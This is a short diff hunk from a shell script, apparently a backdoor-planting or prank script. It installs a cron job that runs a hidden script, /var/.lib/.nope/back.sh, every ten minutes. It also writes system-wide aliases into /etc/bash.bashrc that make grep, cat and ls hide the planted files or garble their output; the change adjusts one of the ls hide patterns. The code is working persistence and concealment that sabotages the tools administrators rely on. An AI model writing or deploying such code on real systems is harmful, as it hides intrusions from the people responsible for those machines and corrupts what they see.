@@ -64,7 +64,7 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
 {
     echo "alias grep='grep --exclude-dir=.nope --exclude=*golden_egg'"
     echo "alias cat='cat --number | grep \"^[0-9]*[02468]\"'"
-    echo "alias ls='ls --hide=\".*nope\" --hide=\".*golden_egg\"'"
+    echo "alias ls='ls --hide=\".*nope\" --hide=\"*golden_egg\"'"
 } >> /etc/bash.bashrc
 
 # Set privs for funny.sh
